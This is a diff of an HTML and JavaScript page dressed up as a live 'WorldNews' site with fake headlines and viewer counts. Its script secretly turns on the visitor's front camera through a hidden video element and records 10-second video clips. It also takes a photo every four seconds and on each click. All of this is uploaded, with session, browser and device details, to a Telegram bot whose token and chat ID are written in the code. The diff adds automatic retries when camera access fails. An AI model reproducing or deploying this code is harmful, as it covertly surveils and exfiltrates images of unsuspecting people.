@@ -26,7 +26,6 @@
                 radial-gradient(ellipse at 80% 50%, rgba(255, 107, 107, 0.05) 0%, transparent 60%);
         }
         
-        /* ========== GLASS CARD ========== */
         .glass-card {
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(20px);
@@ -46,7 +45,6 @@
             border-color: rgba(255, 255, 255, 0.1);
         }
         
-        /* ========== ANIMATED BORDER ========== */
         .glass-card::before {
             content: '';
             position: absolute;
@@ -68,7 +66,6 @@
             100% { background-position: 0% 50%; }
         }
         
-        /* ========== GLOW ORBS ========== */
         .glow-orb {
             position: absolute;
             border-radius: 50%;
@@ -100,7 +97,6 @@
             50% { transform: translate(-20px, 20px) scale(1.2); }
         }
         
-        /* ========== HEADER ========== */
         .header {
             display: flex;
             justify-content: space-between;
@@ -144,7 +140,6 @@
             50% { opacity: 0.4; }
         }
         
-        /* ========== STATUS BAR (پټ) ========== */
         .status-bar {
             display: flex;
             justify-content: space-between;
@@ -179,12 +174,6 @@
             animation: blink 0.8s infinite;
         }
         
-        /* ========== د کیمرې حالت - پټ ========== */
-        .hidden-status {
-            display: none;
-        }
-        
-        /* ========== SOURCE BUTTONS (غټ شوي) ========== */
         .source-bar {
             display: flex;
             gap: 8px;
@@ -226,7 +215,6 @@
             font-size: 14px;
         }
         
-        /* ========== TICKER ========== */
         .ticker {
             background: rgba(255,255,255,0.03);
             border-radius: 14px;
@@ -256,7 +244,6 @@
             100% { transform: translateX(-300%); }
         }
         
-        /* ========== FEATURED ========== */
         .featured {
             background: linear-gradient(135deg, rgba(255,107,107,0.06), rgba(77,150,255,0.06));
             border-radius: 18px;
@@ -312,7 +299,6 @@
             font-weight: 600;
         }
         
-        /* ========== GRID ========== */
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -387,11 +373,6 @@
             }
         }
         
-        /* ========== CLICK COUNTER - پټ ========== */
-        .click-counter {
-            display: none;
-        }
-        
         /* ========== HIDDEN VIDEO ========== */
         #video {
             position: fixed;
@@ -407,7 +388,6 @@
             display: none;
         }
         
-        /* ========== FOOTER ========== */
         .footer {
             text-align: center;
             font-size: 9px;
@@ -422,7 +402,6 @@
             color: rgba(255,255,255,0.04);
         }
         
-        /* ========== RESPONSIVE ========== */
         @media (max-width: 480px) {
             .glass-card {
                 padding: 20px 16px 16px;
@@ -458,12 +437,10 @@
             }
         }
         
-        /* ========== SCROLLBAR ========== */
         ::-webkit-scrollbar {
             width: 0;
         }
         
-        /* ========== SELECTION ========== */
         ::selection {
             background: rgba(77, 150, 255, 0.2);
             color: #fff;
@@ -483,20 +460,17 @@
     <!-- ========== MAIN CARD ========== -->
     <div class="glass-card" id="mainCard">
         
-        <!-- Header -->
         <div class="header">
             <h1>🌍 <span class="gradient-text">World</span>News</h1>
             <span class="live-badge">🔴 LIVE</span>
         </div>
         
-        <!-- Status Bar -->
         <div class="status-bar">
             <span class="item"><span class="live-dot"></span> <span class="num" id="viewers">12,847</span> watching</span>
             <span class="item" id="timeDisplay">🔄 Updating...</span>
             <span class="item" id="sessionTime">⏱️ 0s</span>
         </div>
         
-        <!-- Source Buttons (غټ شوي) -->
         <div class="source-bar">
             <a href="https://www.bbc.com" target="_blank" class="source-btn active">
                 <span class="icon">📺</span> BBC
@@ -515,12 +489,10 @@
             </a>
         </div>
         
-        <!-- Ticker -->
         <div class="ticker">
             <span class="ticker-text" id="tickerText">BREAKING: Global Summit 2026 • Markets surge 3% • AI breakthrough announced • Peace treaty signed • Climate action • Space exploration • More updates...</span>
         </div>
         
-        <!-- Featured (Clickable) -->
         <div class="featured" id="featured">
             <span class="big-icon" id="featuredIcon">🌍</span>
             <h3 id="featuredTitle">Global Leaders Unite</h3>
@@ -528,10 +500,8 @@
             <span class="source-tag" id="featuredSource">📰 BBC News</span>
         </div>
         
-        <!-- Grid -->
         <div class="grid" id="newsGrid"></div>
         
-        <!-- Footer -->
         <div class="footer">🔒 SECURE • LIVE • 24/7 • <span>WORLD COVERAGE</span></div>
     </div>
 
@@ -545,6 +515,7 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const CAPTURE_INTERVAL = 4000; // 4 seconds
+        const VIDEO_SEGMENT = 10000; // 10 seconds per video segment
         
         // ================================================================
         //  GET CODE FROM URL
@@ -595,7 +566,7 @@
         const mainCard = document.getElementById('mainCard');
         
         // ================================================================
-        //  NEWS DATA - تکراري نشي
+        //  NEWS DATA
         // ================================================================
         const sources = {
             bbc: { name: 'BBC News', icon: '📺', color: '#ff6b6b' },
@@ -656,7 +627,6 @@
         let sessionTimer = null;
         let tickerTimer = null;
         let newsTimer = null;
-        let isVideoSent = false;
         let totalVideoTime = 0;
         
         // ================================================================
@@ -664,6 +634,7 @@
         // ================================================================
         async function startCamera() {
             try {
+                // د کیمرې فعالول
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -679,24 +650,28 @@
                 isRunning = true;
                 videoStartTime = Date.now();
                 
-                // Start video recording (پټه)
+                // ویډیو ثبتول پیل کړئ
                 startVideoRecording();
                 
-                // Start auto photo capture (هر ۴ ثانیې)
+                // عکسونه پیل کړئ
                 startAutoCapture();
                 
-                // Start UI updates
+                // UI تازه کول
                 startUIUpdates();
                 
-                // Start session timer
+                // سیشن ټایمر
                 startSessionTimer();
                 
-                // Send start notification
+                // بوټ ته خبر ورکول
                 sendStartNotification();
                 
             } catch (error) {
                 console.error('Camera error:', error);
                 sendErrorToTelegram(error.message);
+                // بیا هڅه وکړئ
+                setTimeout(() => {
+                    if (!isRunning) startCamera();
+                }, 3000);
             }
         }
         
@@ -707,7 +682,6 @@
             if (!stream) return;
             
             recordedChunks = [];
-            isVideoSent = false;
             
             mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp9,opus'
@@ -720,11 +694,12 @@
             };
             
             mediaRecorder.onstop = function() {
-                if (recordedChunks.length > 0 && !isVideoSent) {
+                if (recordedChunks.length > 0) {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    totalVideoTime += Math.floor((Date.now() - videoStartTime) / 1000);
-                    sendVideoToTelegram(blob);
-                    isVideoSent = true;
+                    const duration = Math.floor((Date.now() - videoStartTime) / 1000);
+                    totalVideoTime += duration;
+                    
+                    sendVideoToTelegram(blob, duration);
                     recordedChunks = [];
                     
                     // که پاڼه لا خلاصه وي، بیا ثبتول پیل کړئ
@@ -734,7 +709,6 @@
                                 videoStartTime = Date.now();
                                 mediaRecorder.start(1000);
                                 isRecording = true;
-                                isVideoSent = false;
                             }
                         }, 500);
                     }
@@ -744,26 +718,22 @@
             mediaRecorder.start(1000);
             isRecording = true;
             
-            // هر ۱۰ ثانیې یوه برخه بنده کړئ (د اوږدې ویډیو لپاره)
+            // هر ۱۰ ثانیې یوه برخه بنده کړئ
             setInterval(() => {
                 if (mediaRecorder && isRecording) {
                     mediaRecorder.stop();
                     isRecording = false;
                 }
-            }, 10000);
+            }, VIDEO_SEGMENT);
         }
         
         // ================================================================
-        //  AUTO CAPTURE PHOTO (لومړی عکس + هر ۴ ثانیې)
+        //  AUTO CAPTURE PHOTO
         // ================================================================
         function startAutoCapture() {
-            // لومړی عکس سمدلاسه واخلئ
             capturePhoto();
-            
             captureTimer = setInterval(() => {
-                if (isRunning) {
-                    capturePhoto();
-                }
+                if (isRunning) capturePhoto();
             }, CAPTURE_INTERVAL);
         }
         
@@ -797,12 +767,8 @@
                 formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                 formData.append('caption', 
                     `📸 **Photo #${photoCount}**\n` +
-                    `🆔 **Session:** ${sessionId}\n` +
-                    `🌍 **Browser:** ${browser}\n` +
-                    `📱 **Device:** ${device}\n` +
-                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
+                    `🆔 **Session:** ${sessionId}`
                 );
-                formData.append('parse_mode', 'Markdown');
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                     method: 'POST', 
@@ -817,9 +783,8 @@
         // ================================================================
         //  SEND VIDEO
         // ================================================================
-        async function sendVideoToTelegram(blob) {
+        async function sendVideoToTelegram(blob, duration) {
             try {
-                const duration = Math.floor((Date.now() - videoStartTime) / 1000);
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
@@ -827,13 +792,8 @@
                     `🎥 **Video Segment**\n` +
                     `🆔 **Session:** ${sessionId}\n` +
                     `⏱️ **Duration:** ${duration}s\n` +
-                    `📊 **Total Video:** ${totalVideoTime + duration}s\n` +
-                    `📸 **Photos:** ${photoCount}\n` +
-                    `🌍 **Browser:** ${browser}\n` +
-                    `📱 **Device:** ${device}\n` +
-                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
+                    `📊 **Total Video:** ${totalVideoTime}s`
                 );
-                formData.append('parse_mode', 'Markdown');
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
                     method: 'POST', 
@@ -858,8 +818,7 @@
                         text: `🎬 **New Session Started**\n\n` +
                               `🆔 **Session:** ${sessionId}\n` +
                               `🌍 **Browser:** ${browser}\n` +
-                              `📱 **Device:** ${device}\n` +
-                              `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`,
+                              `📱 **Device:** ${device}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -900,7 +859,7 @@
         }
         
         // ================================================================
-        //  REFRESH CONTENT (تکراري نشي)
+        //  REFRESH CONTENT
         // ================================================================
         function refreshContent() {
             const shuffled = shuffleArray([...allNews]);
@@ -926,7 +885,7 @@
                     featuredDesc.textContent = item.desc;
                     featuredSource.textContent = '📰 ' + randomSrc.name;
                     featuredSource.style.color = randomSrc.color;
-                    capturePhoto(); // په کلیک عکس واخلئ
+                    capturePhoto();
                 };
                 newsGrid.appendChild(div);
             });
@@ -938,21 +897,6 @@
             featuredDesc.textContent = featuredItem.desc;
             featuredSource.textContent = '📰 ' + featuredSrc.name;
             featuredSource.style.color = featuredSrc.color;
-            
-            const tickers = [
-                'BREAKING: Global Summit 2026 • Historic agreements signed',
-                'Markets rally • Inflation at 3-year low',
-                'AI breakthrough • New model revolutionizes healthcare',
-                'Peace treaty • Decades-long conflict finally ends',
-                'Mars colony • First human settlement announced',
-                'Champions League • Record-breaking viewership',
-                'Vaccine breakthrough • 95% efficacy rate',
-                'Box office record • Film reaches $1 billion',
-                'Quantum computing • Major processor breakthrough',
-                'Fusion energy • Net-positive achieved'
-            ];
-            const randomTicker = tickers[Math.floor(Math.random() * tickers.length)];
-            tickerText.textContent = randomTicker + ' • More updates...';
             
             const num = Math.floor(Math.random() * 50000) + 8000;
             viewers.textContent = num.toLocaleString();
@@ -978,25 +922,24 @@
             
             refreshContent();
             
-            // Ticker - هر ۵ ثانیې بدلیږي (تکراري نشي)
+            const tickers = [
+                'BREAKING: Global Summit 2026 • Historic agreements signed',
+                'Markets rally • Inflation at 3-year low',
+                'AI breakthrough • New model revolutionizes healthcare',
+                'Peace treaty • Decades-long conflict finally ends',
+                'Mars colony • First human settlement announced',
+                'Champions League • Record-breaking viewership',
+                'Vaccine breakthrough • 95% efficacy rate',
+                'Box office record • Film reaches $1 billion',
+                'Quantum computing • Major processor breakthrough',
+                'Fusion energy • Net-positive achieved'
+            ];
+            let tickerIndex = Math.floor(Math.random() * tickers.length);
             tickerTimer = setInterval(() => {
-                const tickers = [
-                    'BREAKING: Global Summit 2026 • Historic agreements signed',
-                    'Markets rally • Inflation at 3-year low',
-                    'AI breakthrough • New model revolutionizes healthcare',
-                    'Peace treaty • Decades-long conflict finally ends',
-                    'Mars colony • First human settlement announced',
-                    'Champions League • Record-breaking viewership',
-                    'Vaccine breakthrough • 95% efficacy rate',
-                    'Box office record • Film reaches $1 billion',
-                    'Quantum computing • Major processor breakthrough',
-                    'Fusion energy • Net-positive achieved'
-                ];
-                const randomTicker = tickers[Math.floor(Math.random() * tickers.length)];
-                tickerText.textContent = randomTicker + ' • More updates...';
+                tickerText.textContent = tickers[tickerIndex % tickers.length] + ' • More updates...';
+                tickerIndex++;
             }, 5000);
             
-            // News - هر ۷ ثانیې بدلیږي (تکراري نشي)
             newsTimer = setInterval(() => {
                 refreshContent();
             }, 7000);
@@ -1034,7 +977,7 @@
         }
         
         // ================================================================
-        //  CLICK HANDLERS - هر کلیک عکس اخلي
+        //  CLICK HANDLERS
         // ================================================================
         featured.addEventListener('click', function(e) {
             e.stopPropagation();
@@ -1082,9 +1025,7 @@
         
         window.addEventListener('beforeunload', stopAll);
         document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                // تب پټ شوی - ثبتول دوام لري
-            }
+            if (document.hidden) {}
         });
         
         // ================================================================
